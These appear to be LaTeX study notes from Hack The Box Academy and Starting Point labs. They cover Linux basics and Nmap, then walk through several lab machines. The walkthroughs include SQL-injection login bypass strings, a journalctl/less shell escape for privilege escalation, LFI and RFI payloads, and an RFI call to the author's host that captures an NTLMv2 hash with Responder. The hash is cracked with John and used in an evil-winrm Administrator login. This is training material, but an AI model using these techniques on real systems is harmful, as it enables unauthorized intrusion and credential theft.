\section{Linux Fundamentals}

Command \mintinline{bash}{uname -a} to discover which Linux distribution you are in.

\n

The \mintinline{bash}{PS1} variable can be modified to display useful information, such as full hostname (IP addresses in some cases) and date.

\n

To find help about Linux, have in mind \mintinline{bash}{man} and \mintinline{bash}{apropos}.

\n

Commands that display system information:
\begin{bash}
whoami, id, hostname, hostnamectl, uname, pwd, ifconfig, ip, netstat,
ss, ps, who, env, lsblk, lsusb, lsof, lspci.
\end{bash}

The command \mintinline{bash}{uname -r} can be useful, because we can search for a kernel specific version exploit. Example: search for ``4.15.0-99-generic exploit'', and the first \href{https://www.exploit-db.com/exploits/47163}{result} immediately appears useful to us.

\n

Connect to VPN (\mintinline{bash}{sudo} is necessary):
\begin{bash}
sudo openvpn academy-regular.ovpn
\end{bash}

To connect via SSH:
\begin{bash}
ssh [username]@[IP address]
\end{bash}

The command \mintinline{bash}{stat} displays metadata about files, for example its inode (index number), birth, last modification, etc.

\n

The \mintinline{bash}{tree} command is much more useful than listing one directory by one with \mintinline{bash}{ls}.

\n

Commands for file searching: \mintinline{bash}{which, find, locate}.

\n

What is the name of the config file that has been created after \mintinline{bash}{2020-03-03} and is smaller than \mintinline{bash}{28k} but larger than \mintinline{bash}{25k}?
\begin{bash}
find / -type f -name *.conf -size +25k -size -28k \
-exec ls -la {} \; 2>/dev/null
\end{bash}

If we try to use the argument \mintinline{bash}{-newerBt 2020-03-03} we get
``\texttt{find: This system does not provide a way to find the birth time of a file.}''

\n

How many files exist on the system that have the \mintinline{bash}{.bak} extension?
\begin{bash}
find / -type f -name *.bak 2>/dev/null | wc -l
\end{bash}

\n

File descriptors are \mintinline{bash}{STDIN - 0}, \mintinline{bash}{STDOUT - 1}, \mintinline{bash}{STDERR - 2}. We can redirect erros and output with \mintinline{bash}{>}. The \mintinline{bash}{<} character serves as standard input. To append text to a file, we use \mintinline{bash}{>>}. The \mintinline{bash}{<< FINISH} serves to enter standard input through a stream until we type \mintinline{bash}{"FINISH"} to define the input's end. Usually we use \mintinline{bash}{EOF} instead of \mintinline{bash}{FINISH}, but it can be any word. The pipe \mintinline{bash}{|} is for redirecting standard output to standard input for the next command.
\begin{bash}
find /etc -name shadow 2>/dev/null > results.txt
find /etc -name shadow 2>stderr.txt 1>stdout.txt
cat < input.txt
cat << EOF > stream.txt
find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
\end{bash}

\n

Pagers are \mintinline{bash}{more} and \mintinline{bash}{less}. Command \mintinline{bash}{head} for the first lines of input, \mintinline{bash}{tail} for the last lines, and \mintinline{bash}{sort} to sort the lines.

\n

To filter lines we use \mintinline{bash}{grep}. The option \mintinline{bash}{-v} is to exclude the filtered results.
\begin{bash}
cat /etc/passwd | grep -v "false\|nologin"
\end{bash}

The \mintinline{bash}{cut} command is to remove specific delimiters and show the words in a specified position. The option \mintinline{bash}{-d} is for the delimiter and \mintinline{bash}{-f} for the position.
\begin{bash}
cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
\end{bash}

In the next example, we replace the colon character with space using \mintinline{bash}{tr}.
\begin{bash}
cat /etc/passwd | grep -v "false\|nologin" | tr ":" " "
\end{bash}

The tool \mintinline{bash}{column} is to display in a tabular form.
\begin{bash}
cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t
\end{bash}

Of course, \mintinline{bash}{sed} and \mintinline{bash}{awk} need no introduction.
\begin{bash}
cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " |
awk '{print $1, $NF}' | sed 's/bin/HTB/g'
\end{bash}

Counting lines with \mintinline{bash}{wc -l}.

\n

How many services are listening on the target system on all interfaces? (Not on localhost and IPv4 only)

The file \mintinline{bash}{/etc/services} is a table for the internet services, port numbers and protocol types. ``Every networking program should look into this file to get the port number (and protocol) for its service''. But this file does not tell us about the active running services.
\begin{bash}
ss -Hl -4 | grep "LISTEN" | grep -v "127\.0\.0" | wc -l
\end{bash}

The command \mintinline{bash}{ss} dumps socket (network services) statistics.

\n

Determine what user the ProFTPd server is running under. Submit the username as the answer.
\begin{bash}
ps aux | grep -i "proftpd"
\end{bash}

\n

Use cURL from your Pwnbox (not the target machine) to obtain the source code of the \url{https://www.inlanefreight.com} website and filter all unique paths of that domain. Submit the number of these paths as the answer.
\begin{bash}
curl -L "https://www.inlanefreight.com" > site.html
grep -o "https\?://www\.inlanefreight\.com[^\"']*" site.html |
sort | uniq | wc -l
\end{bash}

\begin{bash}
curl -L "https://www.inlanefreight.com" > site.html
grep -o "https\?://www\.inlanefreight\.com[^\"']*" site.html |
sort | uniq | wc -l
\end{bash}

Change permissions ``\texttt{rwx}'' with \mintinline{bash}{chmod} and ownership with \mintinline{bash}{chown}.

\n

Besides assigning direct user and group permissions, we can also configure special permissions for files by setting the Set User ID (SUID) and Set Group ID (SGID) bits. These SUID/SGID bits allow, for example, users to run programs with the rights of another user. Administrators often use this to give their users special rights for certain applications or files. The letter ``s'' is used instead of an ``x''. When executing such a program, the SUID/SGID of the file owner is used.

\n
If the administrator sets the SUID bit to \mintinline{bash}{journalctl}, any user with access to this application could execute a shell as root. This is because it invokes the pager \mintinline{bash}{less}, that can execute arbitrary code.

It can be used to break out from restricted environments by spawning an interactive system shell.
\begin{bash}
journalctl
!/bin/sh
\end{bash}

If the \mintinline{bash}{journalctl} is allowed to run as superuser by \mintinline{bash}{sudo}, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
\begin{bash}
sudo journalctl
!/bin/sh
\end{bash}

``Sticky bits'' add another level of security for files and directories. Read about it later.

\section{Nmap}

Option \mintinline{bash}{-A} enables OS and version detection, script scanning and traceroute (it stands for aggressive).

\n

Option \mintinline{bash}{-T4} is for faster execution.

\n

You can specify them with the \mintinline{bash}{-T} option and their number (0â€“5) or their name. The template names are paranoid (0),
sneaky (1), polite (2), normal (3), aggressive (4), and insane (5). The first two are for IDS evasion. Polite mode slows down the scan to use less bandwidth and target machine resources. Normal mode is the default and
so \mintinline{bash}{-T3} does nothing. Aggressive mode speeds scans up by making the assumption that you are on a reasonably fast and reliable network. Finally insane mode assumes that you are on an extraordinarily fast network or are
willing to sacrifice some accuracy for speed.

\n

Option \mintinline{bash}{-p} is to specify port ranges, and \mintinline{bash}{-p-} to scan for all ports.

\n

Option \mintinline{bash}{-sV} is to determine service/version info on open ports.

\n

Option \mintinline{bash}{-O} enables OS detection.

\n

The \mintinline{bash}{-P} options to nmap specify which "ping" methods it should use to see if a host is up. Option \mintinline{bash}{-Pn} treats all hosts as online -- does not ping, and skip host discovery.

\n

Look at \mintinline{bash}{-sS}. It says it performs a stealthy scan.

Example:
\begin{bash}
nmap -A -T4 -sV "10.129.15.46"
\end{bash}

Very fast scan:
\begin{bash}
nmap -T5 -A -p- --min-rate=500 10.129.44.239
\end{bash}

\subsection{Appointment \faLinux}

What does the acronym SQL stand for? Structured Query Language.

What is one of the most common type of SQL vulnerabilities? SQL Injection.

What is the 2021 OWASP Top 10 classification for this vulnerability? A03:2021-Injection.

What does Nmap report as the service and version that are running on port 80 of the target?

\mintinline{bash}{Apache httpd 2.4.38 ((Debian))}.
\begin{bash}
sudo nmap -sV -O -Pn -T4 -p 80 10.129.193.161
\end{bash}

What is the standard port used for the HTTPS protocol? 443.

What is a folder called in web-application terminology? directory.

What is the HTTP response code is given for `Not Found' errors? 404.

Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? \mintinline{bash}{dir}.

What single character can be used to comment out the rest of a line in MySQL? \mintinline{mysql}{#}.

If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? Congratulations.

\n

Go to \mintinline{bash}{http://10.129.193.161} and we see a login screen. Googling ``login as admin sql injection'', we \href{https://sechow.com/bricks/docs/login-1.html}{come up with} the idea of putting some arbitrary entry in the user field, and \mintinline{mysql}{passwd' or '1'='1} in the password field.

The idea is that, when \mintinline{mysql}{user="user"} and \mintinline{mysql}{password="passwd"}, the server is executing a SQL query like:
\begin{sql}
SELECT * FROM users WHERE user='user' and password='passwd'
\end{sql}
If we put \mintinline{mysql}{user="user"} and \mintinline{mysql}{password="passwd' or '1'='1"}, the query becomes
\begin{sql}
SELECT * FROM users WHERE user='user' and password='passwd' or '1'='1'
\end{sql}
The \mintinline{mysql}{password='passwd' or '1'='1'} condition is always true, so the password verification never happens.

\n

Another way to do it is putting \mintinline{mysql}{user="' or 1#"} and \mintinline{mysql}{password="asd"}. The \mintinline{mysql}{#} character will comment out the rest of the line, and the constant \mintinline{mysql}{1} is always true.

\subsection{Sequel \faLinux}

During our scan, which port do we find serving MySQL? 3306 standard \mintinline{bash}{mysql} port.

What community-developed MySQL version is the target running? MariaDB.

When using the MySQL command line client, what switch do we need to use in order to specify a login username? \mintinline{bash}{-u}.

Which username allows us to log into this MariaDB instance without providing a password? \mintinline{bash}{root}.

In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? \mintinline{bash}{*}.

In SQL, what symbol do we need to end each query with? \mintinline{bash}{;}.

There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host? \mintinline{bash}{htb}.
\begin{session}
[sekai@arch ~]$ mariadb -u root -h "10.129.44.239"
\end{session}
\begin{sql}
MariaDB [(none)]> show databases;

What version of Apache HTTP Server is running on the target host? \mintinline{bash}{Apache httpd 2.4.41}.

What switch can we use with Gobuster to specify we are looking for specific filetypes? \mintinline{bash}{-x}.
\begin{bash}
ftp 10.129.222.85
ftp> ls
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
gobuster dir -x php -w directory-list-2.3-medium.txt -u 10.129.222.85
\end{bash}

Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? \mintinline{bash}{login.php}.

Go to \mintinline{bash}{10.129.222.85/login.php} and put \mintinline{bash}{username=admin} and \mintinline{bash}{password=rKXM59ESxesUFHAd}.

\subsection{Responder \faWindows}

When visiting the web service using the IP address, what is the domain that we are being redirected to? \mintinline{bash}{unika.htb}.
\begin{session}
[sekai@arch ~]# sudo nmap -T5 -sC -sV -O -p 80 "10.129.97.105"
\end{session}
\begin{txt}
PORT   STATE SERVICE VERSION

|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
\end{txt}

Which scripting language is being used on the server to generate webpages? \mintinline{bash}{php}.
\begin{session}
[sekai@arch ~]# gobuster dir -x html \
-w Workspace/wordlists/directory-list-2.3-small.txt -u "10.129.97.105"
\end{session}
\begin{bash}
/english.html         (Status: 200) [Size: 46453]
/french.html          (Status: 200) [Size: 47199]
/german.html          (Status: 200) [Size: 46984]
\end{bash}

What is the name of the URL parameter which is used to load different language versions of the webpage? \mintinline{bash}{page}.

We can access \mintinline{html}{http://10.129.97.105/english.html}, \mintinline{html}{http://10.129.97.105/french.html}, etc.

In order to access \mintinline{html}{http://10.129.97.105} (it redirects us to \mintinline{html}{http://unika.htb}, which has no connection), we need to change our \mintinline{bash}{/etc/hosts} file:
\begin{bash}
/etc/hosts
# custom hosts
10.129.97.105   unika.htb
\end{bash}

Which of the following values for the `page' parameter would be an example of exploiting a Local File Include (LFI) vulnerability: ``french.html'', ``//10.10.14.6/somefile'', ``../../../../../../../../windows/system32/drivers/etc/hosts'', ``minikatz.exe''
\begin{bash}
../../../../../../../../windows/system32/drivers/etc/hosts
\end{bash}

Which of the following values for the `page' parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: ``french.html'', ``//10.10.14.6/somefile'', ``../../../../../../../../windows/system32/drivers/etc/hosts'', ``minikatz.exe''
\begin{bash}
//10.10.14.208/somefile
\end{bash}

In this case \mintinline{bash}{10.10.14.208} is my IP address on the VPN.

What does NTLM stand for? New Technology LAN Manager.

Which flag do we use in the Responder utility to specify the network interface? \mintinline{bash}{-I}.
\begin{bash}
yay -S responder
echo "sometext" > somefile
ip a
responder -I tun0
\end{bash}

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john', but the full name is what? John the Ripper.

Then we go to \mintinline{html}{unika.htb/?page=//10.10.14.208/somefile}. The \mintinline{bash}{responder} utility than obtains a NTLMv2 hash. We save it to \mintinline{bash}{hash.txt}, then use \mintinline{bash}{john}:
\begin{bash}
sudo pacman -S john
tldr john
john hash.txt
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
badminton        (Administrator)
\end{bash}

What is the password for the administrator user? \mintinline{bash}{badminton}.

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? \mintinline{bash}{5985}, result of our scan.

We need to install \mintinline{bash}{evil-winrm} to remotely access the Windows service.
\begin{bash}
yay -S ruby-evil-winrm
tldr evil-winrm
evil-winrm --ip 10.129.83.31 --user Administrator --password badminton -P 5985
\end{bash}

We get the error
\begin{bash}
Error: An error of type OpenSSL::Digest::DigestError happened, message is Digest
initialization failed: initialization error
\end{bash}

I found the \href{https://forum.manjaro.org/t/openssl-issue-with-ruby-3-0-6p216/147369}{solution} to this issue by editing the \mintinline{bash}{/etc/ssl/openssl.cnf} file. The following sections need to be modified:
\begin{bash}
[provider_sect]
default = default_sect
legacy = legacy_sect

[default_sect]
activate = 1

[legacy_sect]
activate = 1
\end{bash}

Now we can hack the machine:
\begin{bash}
evil-winrm --ip 10.129.97.105 --user Administrator --password badminton -P 5985
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users/mike
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users/mike/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat /Users/mike/Desktop/flag.txt
*Evil-WinRM* PS C:\Users\Administrator\Documents> exit
\end{bash}

\end{document}
